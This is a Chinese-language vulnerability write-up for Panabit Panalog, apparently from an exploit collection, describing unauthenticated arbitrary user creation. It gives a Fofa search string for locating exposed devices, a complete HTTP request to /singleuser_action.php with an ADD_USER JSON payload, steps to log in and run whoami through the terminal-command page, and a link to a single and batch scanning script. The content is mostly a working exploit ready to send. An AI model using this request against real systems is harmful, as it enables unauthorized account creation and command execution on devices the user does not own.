# K8-1Panabit-Panalog任意用户注册

<u></u>





### 漏洞描述：Panabit-Panalog任意用户添加



### Fofa语句：app="Panabit-Panalog"



### 漏洞复现：

```
GET /singleuser_action.php HTTP/1.1

Host: xxx

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none

Sec-Fetch-User: ?1

Te: trailers

Connection: close

Content-Length: 574



{ "syncInfo": { "user": { "userId": "wmtools", "userName": "wmtools", "employeeId": "wmtools", "departmentId": "wmtools", "departmentName": "wmtools", "coporationId": "wmtools", "corporationName": "wmtools", "userSex": "1", "userDuty": "wmtools", "userBirthday": "wmtools", "userPost": "wmtools", "userPostCode": "wmtools", "userAlias": "wmtools", "userRank": "wmtools", "userPhone": "wmtools", "userHomeAddress": "wmtools", "userMobilePhone": "wmtools", "userMailAddress": "wmtools", "userMSN": "wmtools", "userNt": "wmtools", "userCA": "wmtools", "userPwd": "wmtools", "userClass": "wmtools", "parentId": "wmtools", "bxlx": "wmtools" },"operationType": "ADD_USER" } }
```



查看响应包。返回注册成功信息



登录成功，进入页面



二、命令执行

系统维护--->终端命令--->命令执行whoami
 三、漏洞检测
 单个检测

python .\PanalogAddUser.py -u https://ip:port

 

批量检测
 python .\PanalogAddUser.py -f filename

 检测脚本链接：https://pan.baidu.com/s/1cCNB7PP8MSLxzF349cKdDg?pwd=hglx

提取码：hglx